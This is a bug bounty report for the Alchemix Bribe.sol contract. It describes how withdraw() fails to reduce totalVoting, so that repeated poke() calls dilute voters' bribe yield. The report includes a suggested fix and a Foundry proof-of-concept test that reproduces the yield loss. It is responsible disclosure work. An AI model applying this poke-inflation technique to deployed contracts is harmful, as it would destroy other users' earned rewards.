# 31527 - \[SC - Critical] No accounting for totalVoting in Bribesolwithdr...

Submitted on May 21st 2024 at 02:17:27 UTC by @gladiator111 for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31527

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Bribe.sol>

Impacts:

* Permanent freezing of unclaimed yield

## Description

## Brief/Intro

`Bribe.sol::withdraw` doesn't decrease `totalVoting` which can be exploited by a malicious user to permanently decrease yield.

## Vulnerability Details

In the function, `Bribe.sol::withdraw`,`totalVoting` is not decreased and checkpointed as expected. The Withdraw function is called when a user withdraws their vote. It should decrease totalVoting but it is not.

```solidity
    //Doesn't decrease TotalVoting
    function withdraw(uint256 amount, uint256 tokenId) external {
        require(msg.sender == voter);

        totalSupply -= amount;
        balanceOf[tokenId] -= amount;

        _writeCheckpoint(tokenId, balanceOf[tokenId]);
        _writeSupplyCheckpoint();

        emit Withdraw(msg.sender, tokenId, amount);
    }
```

This can be exploited by malicious user, as the user can call poke repeatedly (as it doesn't have same Epoch constraints) to indefinitely increase totalSupply. When totalVoting is increased the earned yield will also decrease as follows

```solidity
reward += (cp.balanceOf * tokenRewardsPerEpoch[token][_lastEpochStart]) / _priorSupply;   //_priorSupply is totalVoting in the epoch
```

Users will earn far less yield. The more times the `poke` function is called, the less the yield will become. `Note - It doesn't even need a malicious user as some users will call poke after voting which will decrease yield`

## Impact Details

The Yield will be permanently frozen/lost.

## Suggestions/ Recommendations

modify the function as follows

```diff
    function withdraw(uint256 amount, uint256 tokenId) external {
        require(msg.sender == voter);

        totalSupply -= amount;
        balanceOf[tokenId] -= amount;
+       totalVoting -= amount;

+       _writeVotingCheckpoint();
        _writeCheckpoint(tokenId, balanceOf[tokenId]);
        _writeSupplyCheckpoint();

        emit Withdraw(msg.sender, tokenId, amount);
    }
```

## References

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Bribe.sol#L319-329>

## Proof of Concept

Paste the following in Voting.t.sol and run using

```bash
forge test --match-test testYieldLoss -vvvv --fork-url $FORK_URL
```

```solidity
function testYieldLoss() public {
        uint256 tokenId1 = createVeAlcx(admin, TOKEN_1, MAXTIME, false);
        uint256 tokenId2 = createVeAlcx(beef, TOKEN_1, MAXTIME, false);
        address bribeAddress1 = voter.bribes(address(sushiGauge));
        address bribeAddress2 = voter.bribes(address(balancerGauge));
        createThirdPartyBribe(bribeAddress1, bal, 1e19);
        createThirdPartyBribe(bribeAddress1, aura, 1e19);
        createThirdPartyBribe(bribeAddress2, bal, 1e19);
        createThirdPartyBribe(bribeAddress2, aura, 1e19);

        address[] memory pools = new address[](2);
        pools[0] = sushiPoolAddress;
        pools[1] = balancerPoolAddress;
        uint256[] memory weights = new uint256[](2);
        weights[0] = 5000;
        weights[1] = 5000;

        address[] memory bribes = new address[](2);
        bribes[0] = address(bribeAddress1); 
        bribes[1] = address(bribeAddress2); 

        address[][] memory tokens = new address[][](2);
        tokens[0] = new address[](2);                
        tokens[0][0] = bal;
        tokens[0][1] = aura;
        tokens[1] = new address[](2);                
        tokens[1][0] = bal;
        tokens[1][1] = aura;

        hevm.prank(admin);
        voter.vote(tokenId1, pools, weights, 0);
        console.log(IBribe(bribeAddress1).totalVoting());
        hevm.prank(beef);
        voter.vote(tokenId2,pools,weights,0);
        console.log(IBribe(bribeAddress1).totalVoting());

        for(uint256 i =0;i<20;i++){                // calling poke again and again
        hevm.prank(admin);
        voter.poke(tokenId1);
        }
        console.log(IBribe(bribeAddress1).totalVoting());  //totalVotes increase significantly

        hevm.warp(block.timestamp + nextEpoch);

        uint256 beforeBalance = IERC20(bal).balanceOf(beef);
        hevm.prank(beef);
        voter.claimBribes(bribes, tokens, tokenId2);
        uint256 afterBalance = IERC20(bal).balanceOf(beef);
        console.log(afterBalance-beforeBalance);              //user gets far less yield
}
```
